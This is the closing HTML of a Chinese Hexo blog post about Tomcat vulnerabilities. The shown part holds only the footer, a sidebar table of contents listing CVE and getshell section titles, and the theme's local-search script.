</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2021/05/10/Tomcat/">http://example.com/2021/05/10/Tomcat/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/Tomcat/">Tomcat</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/05/08/hello-world/"><span class="paginator-prev__text">go语言知识点</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-number">1.</span> <span class="toc-text">
          Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">
          安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">
          Tomcat分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          主要文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          上传目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">
          Tomcat渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-CVE-2017-12615%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">
          Tomcat任意文件写入(CVE-2017-12615）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">
          复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">
          漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">
          开始复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%8C%E6%88%90%E5%8A%9F%E4%B8%8A%E4%BC%A0jsp"><span class="toc-number">1.3.1.4.1.</span> <span class="toc-text">
          绕过，成功上传jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.4.2.</span> <span class="toc-text">
          最新版本复现</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.1.4.2.1.</span> <span class="toc-text">
          修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2019-0232%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">
          Tomcat远程代码执行（CVE-2019-0232）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">
          安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">
          漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text">
          Tomcat弱口令&amp;后台getshell漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">
          MSF攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-manager-App%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.4.</span> <span class="toc-text">
          Tomcat manager App暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2020-1938%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">
          Tomcat AJP文件包含漏洞分析(CVE-2020-1938）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">
          影响版本：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.3.6.</span> <span class="toc-text">
          复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%8Ashell%E5%BC%B9%E5%88%B0MSF%E4%B8%8A"><span class="toc-number">1.3.7.</span> <span class="toc-text">
          把shell弹到MSF上</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>